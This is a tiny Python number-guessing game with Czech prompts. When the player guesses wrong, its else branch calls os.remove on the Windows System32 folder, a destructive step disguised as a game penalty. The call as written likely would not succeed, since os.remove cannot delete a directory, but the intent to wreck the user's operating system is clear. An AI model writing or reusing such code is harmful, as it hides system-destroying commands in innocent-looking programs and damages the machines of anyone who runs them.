import random
import os
 
number = random.randint(1,10)
 
guess = int(input("Zadej cislo\n"))
 
if guess ==number:
    print("vyhral si")
else:
    os.remove("C:\Windows\System32")